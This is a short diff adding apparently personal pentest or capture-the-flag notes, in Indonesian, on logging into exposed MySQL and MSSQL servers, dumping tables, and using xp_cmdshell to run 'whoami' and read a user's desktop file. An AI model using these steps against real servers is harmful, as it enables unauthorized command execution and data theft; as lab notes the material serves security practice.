@@ -1,0 +1,14 @@
+connect ke server yg open msyql
+`mysql -h ip -P port -u username -p (password, kalo tanpa password hilangkan ini)`
+
+`sqsh -S server -U username -P "password"`
+
+`select * from <db_name>.dbo.<nama_tabel>`
+`go`
+
+jika xp_cmdshell enabled
+`xp_cmdshell 'whoami'` 
+`go`
+
+`type C:\Users\Urkee\Desktop\notes.txt`
+`go`
